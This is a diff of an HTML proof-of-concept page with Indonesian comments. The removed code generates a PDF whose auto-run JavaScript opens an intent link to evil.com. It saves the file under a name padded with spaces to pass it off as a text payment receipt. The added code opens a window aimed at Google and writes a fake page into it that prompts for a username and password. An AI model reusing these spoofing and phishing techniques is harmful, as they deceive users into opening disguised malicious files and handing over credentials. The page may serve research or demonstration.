@@ -1,37 +1,30 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Generate Redirect PDF</title>
-  <script src="https://unpkg.com/pdf-lib@1.17.1/dist/pdf-lib.min.js"></script>
-  <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
-</head>
-<body>
-  <button onclick="generatePDF()">Save Redirect PDF</button>
+  <body>
+    <button onclick="spoof()">Click to spoof</button>
 
-  <script>
-    async function generatePDF() {
-      const { PDFDocument } = PDFLib;
-      const pdfDoc = await PDFDocument.create();
-      const page = pdfDoc.addPage([400, 200]);
+    <script>
+      function spoof() {
+        // Buka jendela baru pointing ke target (akan menjadi spoofed URL)
+        let win = window.open("_blank", "https://www.google.com/csi");
 
-      page.drawText('Redirecting...', { x: 50, y: 100, size: 24 });
-
-      // Embed JavaScript redirect (not all viewers support this!)
-      pdfDoc.catalog.set(
-        PDFLib.PDFName.of('OpenAction'),
-        pdfDoc.context.obj({
-          S: 'JavaScript',
-          JS: PDFLib.PDFString.of(`app.launchURL("intent://evil.com#Intent;scheme=https;package=com.sec.android.app.sbrowser;end", true);`)
-        })
-      );
-
-      const pdfBytes = await pdfDoc.save();
-      const blob = new Blob([pdfBytes], { type: "application/pdf" });
-
-      const fakeName = "bukti_pembayaran.txt" + " ".repeat(150) + ".pdf";
-      saveAs(blob, fakeName);
-    }
-  </script>
-</body>
+        // Setelah 50ms, injeksikan konten sebelum navigasi selesai
+        setTimeout(() => {
+          try {
+            win.document.write(`
+  <h1>This is not Google!</h1>
+<button onclick="
+  let username = prompt('Enter your username');
+  let password = prompt('Enter your password');
+  alert('Your creds:\\nUsername: ' + username + '\\nPassword: ' + password);
+">Click me</button>
+            `);
+            win.document.close();
+          } catch (e) {
+            console.warn("Blocked by browser protections:", e);
+          }
+        }, 50);
+      }
+    </script>
+  </body>
 </html>
